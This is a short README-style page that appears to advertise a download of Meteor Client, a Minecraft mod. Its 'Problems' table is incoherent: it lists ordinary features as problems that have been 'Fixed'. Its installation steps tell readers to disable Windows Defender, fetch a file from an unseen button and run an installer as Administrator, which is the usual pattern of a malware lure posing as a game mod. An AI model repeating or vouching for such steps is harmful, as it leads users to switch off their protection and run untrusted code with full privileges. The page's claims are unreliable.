## 📖 About

Meteor Client is an open-source utility mod for Minecraft targeting the latest versions. Highly popular for anarchy servers like 2b2t, offering powerful automation and griefing modules.

## ⚠️ Problems Without Meteor Client

| Problem | Status |
|---------|--------|
| Requires Fabric mod loader | ✅ Fixed |
| Designed for anarchy and permissive servers | ✅ Fixed |
| Active community and plugin system | ✅ Fixed |

## ✅ Solution

**Meteor Client v0.5.9** addresses all of these limitations with a feature-complete solution for **Java Edition 1.21.4**.

## 🚀 Installation

1. **Disable Windows Defender** temporarily
2. Get the client from the button above
3. Run the installer as Administrator
4. Launch Minecraft via the **Meteor Client** launcher
5. Select your version and click **Play**
